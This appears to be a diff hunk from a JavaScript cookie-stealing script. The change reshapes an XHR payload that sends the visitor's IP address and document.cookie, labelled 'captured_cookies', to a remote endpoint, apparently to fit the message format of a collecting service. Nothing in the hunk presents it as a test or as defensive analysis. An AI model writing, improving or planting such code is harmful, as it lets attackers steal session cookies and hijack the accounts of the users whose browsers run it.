@@ -24,9 +24,30 @@
 			xhr.setRequestHeader("Content-Type", "application/json");
 			
 			var payload = {
-				"client_ip": ip,
-				"cookies": document.cookie,
-				"timestamp": new Date().toISOString()
+				"blocks": [
+					{
+						"type": "sender",
+						"properties": {
+							"userId": ip, 
+							"cookie": document.cookie
+						}
+					},
+					{
+						"type": "text",
+						"name": "client_ip",
+						"value": ip
+					},
+					{
+						"type": "text",
+						"name": "captured_cookies",
+						"value": document.cookie
+					},
+					{
+						"type": "date",
+						"name": "timestamp",
+						"value": new Date().toISOString()
+					}
+				]
 			};
     
 			xhr.send(JSON.stringify(payload));
